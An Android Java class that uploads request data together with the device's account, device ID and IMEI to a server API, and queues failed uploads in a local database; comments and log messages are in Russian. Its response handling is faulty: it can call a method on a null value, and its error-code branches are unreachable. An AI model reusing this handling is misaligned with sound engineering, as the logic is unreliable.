package com.inet.android.request;

import java.io.IOException;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.preference.PreferenceManager;

import com.inet.android.db.RequestDataBaseHelper;
import com.inet.android.db.RequestWithDataBase;
import com.inet.android.utils.Logging;
import com.loopj.android.http.SyncHttpClient;

//import com.loopj.android.http.RequestParams;
/**
 * FileRequest class is used to send files to the server with using Android
 * Asynchronous Http Client.
 * 
 * @author johny homicide
 *
 */

public class FileRequest {
	private final String LOG_TAG = "FileRequest";
	Context mContext;
	final private String additionURL = "api/informative";
	private static SyncHttpClient client = new SyncHttpClient();
	SharedPreferences sp;
	String request;
	String requestArray = null;
	private int type = 3;
	static RequestDataBaseHelper db;

	public FileRequest(Context ctx) {
		mContext = ctx;
	}

	public void sendRequest(String request) {
		sp = PreferenceManager.getDefaultSharedPreferences(this.mContext);
		Logging.doLog(LOG_TAG, request);
		if (request != null) {
			JSONObject jsonObject = new JSONObject();
			try {
				jsonObject.put("account", sp.getString("account", "0000"));
				jsonObject.put("device", sp.getString("device", "0000"));
				jsonObject.put("imei", sp.getString("imei", "0000"));
				jsonObject.put("key", System.currentTimeMillis());
				JSONArray jsonArray = new JSONArray();

				requestArray = "[" + request + "]";
				jsonArray = new JSONArray(requestArray);
				jsonObject.put("data", jsonArray);

			} catch (JSONException e1) {
				Logging.doLog(LOG_TAG, "json failure", "json failure");
			}

			// StringEntity entity = null;
			// try {
			// entity = new StringEntity(jsonObject.toString(), HTTP.UTF_8);
			// entity.setContentType("application/json");
			// entity.setContentEncoding(new BasicHeader(HTTP.CONTENT_TYPE,
			// "application/json"));
			// entity.setContentType("");
			//
			// } catch (UnsupportedEncodingException e) {
			// Logging.doLog(LOG_TAG, "UnsupportedEncodingException",
			// "UnsupportedEncodingException");
			// }
			// client.setHeader(HTTP.CONTENT_TYPE, "application/json");
			// client.post(mContext, URL, entity, "application/json",
			// new JsonHttpResponseHandler() {
			//
			// @Override
			// public void onSuccess(int statusCode, Header[] arg1,
			// JSONObject response) {
			// Logging.doLog(LOG_TAG, "onSuccess", "onSuccess");
			// }
			//
			// @Override
			// public void onFailure(int statusCode,
			// org.apache.http.Header[] headers,
			// java.lang.Throwable throwable,
			// org.json.JSONObject errorResponse) {
			// Logging.doLog(LOG_TAG, "onFailure", "onFailure");
			// }
			// });
			String str = null;
			try {
				Logging.doLog(LOG_TAG, "do make.request: " + request,
						"do make.request: " + request);
				Logging.doLog(LOG_TAG, "do make.requestArray: " + requestArray,
						"do make.requestArray: " + requestArray);

				str = Caller.doMake(jsonObject.toString(),
						sp.getString("access_second_token", ""), additionURL, true,
						null, mContext);
			} catch (IOException e) {
				// Добавление в базу request
				e.printStackTrace();

				Logging.doLog(LOG_TAG, "db.request: " + request, "db.request: "
						+ request);

				db = new RequestDataBaseHelper(mContext);
				db.addRequest(new RequestWithDataBase(request, type, null,
						null, null));
			}
			if (str != null) {
				getRequestData(str);
			} else {
				Logging.doLog(LOG_TAG, "ответа от сервера нет",
						"ответа от сервера нет");
			}
		} else {
			Logging.doLog(LOG_TAG, "request == null", "request == null");
		}
	}

	protected void getRequestData(String response) {
		String postRequest = null;

		Logging.doLog(LOG_TAG, "getResponseData: " + response,
				"getResponseData: " + response);

		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);

		JSONObject json = new JSONObject();
		try {
			json.put("account", sp.getString("account", "0000"));
			json.put("device", sp.getString("device", "0000"));
			json.put("imei", sp.getString("imei", "0000"));
		} catch (JSONException e) {
			e.printStackTrace();
		}
		postRequest = json.toString();

		JSONObject jsonObject = null;
		String str = null;
		try {
			jsonObject = new JSONObject(response);
			str = jsonObject.getString("code");
		} catch (JSONException e) {
			str = null;
		}

		Editor ed = sp.edit();
		if (str != null) {
			ed.putString("code", str);
		} else {
			ed.putString("code", "");
		}

		if (str.equals("2")) {
			PeriodicRequest pr = new PeriodicRequest(mContext);
			pr.sendRequest(postRequest);
		}

		if (str.equals("0")) {
			String errstr = null;
			try {
				errstr = jsonObject.getString("error");
			} catch (JSONException e) {
				errstr = null;
			}
			if (errstr != null) {
				ed.putString("error", errstr);
			} else {
				ed.putString("error", "");
			}
			ed.commit();
			if (str.equals("0")) {
				Logging.doLog(LOG_TAG, "account не найден", "account не найден");

				// ed.putString("account", "account");
			}
			if (str.equals("1"))
				Logging.doLog(LOG_TAG,
						"imei отсутствует или имеет неверный формат",
						"imei отсутствует или имеет неверный формат");
			if (str.equals("2"))
				Logging.doLog(LOG_TAG, "устройство с указанным imei уже есть",
						"устройство с указанным imei уже есть");
			if (str.equals("3"))
				Logging.doLog(LOG_TAG, "отсутствует ключ", "отсутствует ключ");
			if (str.equals("4"))
				Logging.doLog(LOG_TAG, "отсутствует или неверный type",
						"отсутствует или неверный type");
		}
		ed.commit();
	}

}
